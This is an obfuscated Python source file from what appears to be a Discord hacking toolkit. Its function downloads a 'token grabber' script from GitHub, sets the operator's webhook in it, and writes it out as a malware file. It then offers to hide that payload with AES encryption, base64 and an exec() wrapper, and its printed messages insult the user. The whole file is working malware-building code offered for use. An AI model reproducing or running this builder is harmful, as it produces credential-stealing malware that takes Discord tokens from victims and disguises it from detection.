import os 
import shutil 
import requests 
import base64 
import random 
import PyInstaller .__main__ 
from Crypto .Cipher import AES 
from Crypto import Random 
from colorama import Fore 
from plugins .standard import setTitle ,installPackage 
def f1bergrabber (OOO000000O00000O0 ,OO0OOOOOOO00000O0 ):
    OO0O0OO00OO00O0OO =['requests','psutil','pypiwin32','pycryptodome','pyinstaller','pillow',]
    installPackage (OO0O0OO00OO00O0OO )
    OOOO0OO00OOOOO000 =requests .get ("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text .replace ("WEBHOOK_HERE",OOO000000O00000O0 )
    with open (f"{OO0OOOOOOO00000O0}.py",'w',errors ="ignore")as OO000000O0000OOOO :
        OO000000O0000OOOO .write (OOOO0OO00OOOOO000 )
    print (f"Do you want to obfuscate {OO0OOOOOOO00000O0}.exe?")
    O0O0O0OO0O0OO0O0O =input (f'{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.RESET}y/n: {Fore.RED}')
    if O0O0O0OO0O0OO0O0O .lower ()=="y"or O0O0O0OO0O0OO0O0O .lower ()=="yes":
        OO0O0000OO000000O =Random .new ().read (AES .block_size )
        O0OO0000OOOOO0OO0 =u''
        for O00OOOOOO0OOO00OO in range (8 ):
            O0OO0000OOOOO0OO0 =O0OO0000OOOOO0OO0 +chr (random .randint (0x4E00 ,0x9FA5 ))
        with open (f'{OO0OOOOOOO00000O0}.py')as OO000000O0000OOOO :
            _O0OOO0OOO00000000 =OO000000O0000OOOO .read ()
            O0O0OO00O0OOO0O0O =''
            O0OO0O000OO00O000 =_O0OOO0OOO00000000 .splitlines ()
            for O00OOOOOO0OOO00OO in O0OO0O000OO00O000 :
                if O00OOOOOO0OOO00OO .startswith ("import")or O00OOOOOO0OOO00OO .startswith ("from"):
                    O0O0OO00O0OOO0O0O +=O00OOOOOO0OOO00OO +';'
        with open (f'{OO0OOOOOOO00000O0}.py',"wb")as OO000000O0000OOOO :
            O0O0O0OO00O0000OO =base64 .b64encode (_O0OOO0OOO00000000 .encode ())
            O00OO0OO0O0OOO0O0 =AES .new (O0OO0000OOOOO0OO0 .encode (),AES .MODE_CFB ,OO0O0000OO000000O ).encrypt (O0O0O0OO00O0000OO )
            OO000000O0000OOOO .write (f'{O0O0OO00O0OOO0O0O}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({O0OO0000OOOOO0OO0.encode()}, AES.MODE_CFB, {OO0O0000OO000000O}).decrypt({O00OO0OO0O0OOO0O0})).decode())'.encode ())
    try :
        shutil .rmtree ('build')
        shutil .rmtree ('dist')
        shutil .rmtree ('__pycache__')
        os .remove (f'{OO0OOOOOOO00000O0}.spec')
    except FileNotFoundError :
        pass 
    print (f"\n{Fore.LIGHTRED_EX}File created as {OO0OOOOOOO00000O0}.py\n")
    print (f"{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.WHITE}I have not added the feature to make it exe. Convert it yourself lazy bitch{Fore.RED}")
    print (f"{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.WHITE}And if you don't even know how to do that then you can dm me.(Check README.txt){Fore.RED}")
    input (f'{Fore.LIGHTRED_EX}[{Fore.WHITE}>>>{Fore.LIGHTRED_EX}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    os .system ('cmd /k "python util/f1ber/discordtools.py"')
